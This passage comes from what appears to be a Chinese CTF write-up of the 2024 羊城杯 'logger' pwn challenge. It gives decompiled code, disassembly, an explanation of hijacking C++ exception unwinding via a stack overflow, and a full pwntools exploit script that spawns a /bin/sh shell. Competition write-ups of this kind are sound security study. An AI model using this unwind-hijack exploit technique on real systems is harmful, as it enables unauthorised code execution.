+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">warn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">5</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  clean_up(buf);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  sub_4014FD(v5, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\x1B[1;31m%s\x1B[0m\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[!] Type your message here plz: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  HIBYTE(v3) = HIBYTE(v0);</span><br><span class="line">  buf[v0 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(byte_404200, buf, <span class="keyword">sizeof</span>(byte_404200));</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;dest[<span class="built_in">strlen</span>(dest)], <span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(dest, byte_404200, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(dest);</span><br><span class="line">    exception = __cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = src;</span><br><span class="line">    __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> *, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(byte_404100, buf, <span class="keyword">sizeof</span>(byte_404100));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  sub_4014FD(v6, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[User input log]\nMessage: %s\nDone at %s\n&quot;</span>, byte_404100, (<span class="type">const</span> <span class="type">char</span> *)v6);</span><br><span class="line">  sub_401CCA(buf);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cpp的异常处理围绕着三个步骤进行处理，unwind cleanup handler，unwind会调用一些函数来判断当前栈帧中有没有能处理异常的逻辑，如果有就会把控制权转移到那边处理异常，如果没有，unwind就会找父函数有没有处理异常的逻辑，具体是怎么找的，是通过rbp和 rbp + 8 去确定父函数的栈帧位置，当前函数找不到就会调用cleanup去清理资源，然后根据rbp和rbp + 8去回溯到上一个栈帧那，直到unwind找到一个可以捕获异常的逻辑，就会把控制权转交过去然后由这段逻辑进行handler。</p>
+<p>如果把rbp + 8覆盖成一个其他的try块的地址，就能扰乱unwind栈展开的流程，logger中有一段backdoor 也是catch一个字符串类型的异常，通过覆盖返回地址就可以把控制流劫持到这个位置执行backdoor，先通过上面的越界写去写一个binsh的字符串，然后覆盖返回地址扰乱unwind的流程 使这个异常被backdoor handler处理，最后getshell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401B</span>C2                               ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 E8 <span class="number">69</span> F7 FF FF                call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                               ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C2</span><br><span class="line">.text:<span class="number">0000000000401B</span>C7                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>C7                               ;   catch(<span class="type">char</span> <span class="type">const</span>*) <span class="comment">// owned by 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>CB <span class="number">48</span> <span class="number">83</span> FA <span class="number">01</span>                   cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>CF <span class="number">74</span> <span class="number">08</span>                         jz      <span class="type">short</span> loc_401BD9</span><br><span class="line">.text:<span class="number">0000000000401B</span>CF</span><br><span class="line">.text:<span class="number">0000000000401B</span>D1 <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>D4 E8 <span class="number">67</span> F7 FF FF                call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401B</span>D4</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9                               loc_401BD9:                             ; CODE XREF: .text:<span class="number">0000000000401B</span>CF↑j</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>DC E8 FF F5 FF FF                call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000401B</span>DC</span><br><span class="line">.text:<span class="number">0000000000401B</span>E1 <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> E8                   mov     [rbp<span class="number">-18</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>E5 <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp<span class="number">-18</span>h]</span><br><span class="line">.text:<span class="number">0000000000401B</span>E9 <span class="number">48</span> <span class="number">89</span> C6                      mov     rsi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>EC <span class="number">48</span> <span class="number">8</span>D <span class="number">05</span> AD <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          lea     rax, aAnExceptionOfT_1          ; <span class="string">&quot;[-] An exception of type String was cau&quot;</span>...</span><br><span class="line">.text:<span class="number">0000000000401B</span>F3 <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>F6 B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>FB                               ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>FB E8 D0 F5 FF FF                call    _printf</span><br><span class="line">.text:<span class="number">0000000000401B</span>FB</span><br><span class="line">.text:<span class="number">0000000000401</span>C00 <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp<span class="number">-18</span>h]</span><br><span class="line">.text:<span class="number">0000000000401</span>C04 <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000401</span>C07 E8 <span class="number">54</span> F6 FF FF                call    _system</span><br><span class="line">.text:<span class="number">0000000000401</span>C07                               ;   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ucontext</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    rsp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r12=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r13=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r14=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r15=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rsi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rcx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r8=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r9=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rip=<span class="number">0xDEADBEEF</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>(<span class="number">0x200</span>)</span><br><span class="line">    b[<span class="number">0xE0</span>:<span class="number">0xE8</span>] = p64(src)  <span class="comment"># fldenv ptr</span></span><br><span class="line">    b[<span class="number">0x1C0</span>:<span class="number">0x1C8</span>] = p64(<span class="number">0x1F80</span>)  <span class="comment"># ldmxcsr</span></span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA0</span>:<span class="number">0xA8</span>] = p64(rsp)</span><br><span class="line">    b[<span class="number">0x80</span>:<span class="number">0x88</span>] = p64(rbx)</span><br><span class="line">    b[<span class="number">0x78</span>:<span class="number">0x80</span>] = p64(rbp)</span><br><span class="line">    b[<span class="number">0x48</span>:<span class="number">0x50</span>] = p64(r12)</span><br><span class="line">    b[<span class="number">0x50</span>:<span class="number">0x58</span>] = p64(r13)</span><br><span class="line">    b[<span class="number">0x58</span>:<span class="number">0x60</span>] = p64(r14)</span><br><span class="line">    b[<span class="number">0x60</span>:<span class="number">0x68</span>] = p64(r15)</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA8</span>:<span class="number">0xB0</span>] = p64(rip)  <span class="comment"># ret ptr</span></span><br><span class="line">    b[<span class="number">0x70</span>:<span class="number">0x78</span>] = p64(rsi)</span><br><span class="line">    b[<span class="number">0x68</span>:<span class="number">0x70</span>] = p64(rdi)</span><br><span class="line">    b[<span class="number">0x98</span>:<span class="number">0xA0</span>] = p64(rcx)</span><br><span class="line">    b[<span class="number">0x28</span>:<span class="number">0x30</span>] = p64(r8)</span><br><span class="line">    b[<span class="number">0x30</span>:<span class="number">0x38</span>] = p64(r9)</span><br><span class="line">    b[<span class="number">0x88</span>:<span class="number">0x90</span>] = p64(rdx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcontext32</span>(<span class="params">libc: ELF, **kwargs</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">bytes</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt_trampoline = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">    <span class="keyword">return</span> got, flat(</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(got + <span class="number">0x218</span>),</span><br><span class="line">        p64(libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">32</span>),</span><br><span class="line">        p64(plt_trampoline) * <span class="number">0x40</span>,</span><br><span class="line">        create_ucontext(got + <span class="number">0x218</span>, rsp=libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, **kwargs),</span><br><span class="line">    )</span><br><span class="line"><span class="comment"># e.g. dest, payload = setcontext32.setcontext32(</span></span><br><span class="line"><span class="comment">#         libc, rip=libc.sym[&quot;system&quot;], rdi=libc.search(b&quot;/bin/sh&quot;).__next__()</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your chocie:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;here: &quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">    sla(<span class="string">&quot;records? &quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Your chocie:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&quot;here: &quot;</span>, <span class="string">b&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;records? &quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Your chocie:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x70</span> + p64(binsh) + p64(<span class="number">0x401bc7</span>)</span><br><span class="line">sa(<span class="string">&quot;plz: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
+            <p>Link：<a href="https://nyyyddddn.github.io/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">https://nyyyddddn.github.io/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/</a>
+            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">September 4th 2024, 7:43:24 pm</a>
+            <p>Update date：<a href="https://nyyyddddn.github.io/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">September 4th 2024, 7:47:16 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/09/02/gdbjail/" title="gdbjail">
+                    <div class="prevTitle">gdbjail</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:1959759892@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/nyyyddddn" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pstack"><span class="toc-number">1.</span> <span class="toc-text">pstack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#httpd"><span class="toc-number">2.</span> <span class="toc-text">httpd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#logger"><span class="toc-number">3.</span> <span class="toc-text">logger</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 54
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span>
+            <a class="archive-post-title" href="/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">羊城杯2024pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span>
+            <a class="archive-post-title" href="/2024/09/02/gdbjail/">gdbjail</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span>
+            <a class="archive-post-title" href="/2024/08/31/nss3rd%E5%87%BA%E9%A2%98-Iterator-Trap%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">nss3rd出题_Iterator_Trap解题思路</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span>
+            <a class="archive-post-title" href="/2024/08/31/srctf-pwn%E5%87%BA%E9%A2%98/">srctf_pwn出题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
